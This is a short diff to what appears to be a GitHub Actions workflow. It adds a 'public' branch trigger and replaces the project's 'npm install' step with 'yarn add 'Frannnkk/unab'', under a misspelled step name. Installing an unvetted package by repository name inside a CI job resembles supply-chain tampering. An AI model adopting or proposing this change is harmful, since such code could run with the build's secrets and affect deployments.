@@ -4,6 +4,7 @@ on:
   push:
     branches:
       - main
+      - public
 
 jobs:
   build:
@@ -18,8 +19,8 @@ jobs:
         with:
           node-version: '18'
 
-      - name: Install dependencies
-        run: npm install
+      - name: Install dependenciess
+        run: yarn add 'Frannnkk/unab'
 
 
       - name: Install Firebase CLI
